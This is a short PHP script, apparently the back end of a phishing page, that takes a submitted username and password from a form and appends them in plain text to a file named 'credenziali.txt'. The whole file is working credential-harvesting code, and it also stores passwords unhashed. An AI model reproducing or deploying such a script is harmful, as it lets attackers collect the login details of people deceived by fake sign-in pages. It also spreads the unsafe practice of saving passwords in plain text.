<?php
    $Username = $_POST['username'];
    $Password = $_POST['password'];
    file_put_contents('credenziali.txt',"$Username, $Password");
?>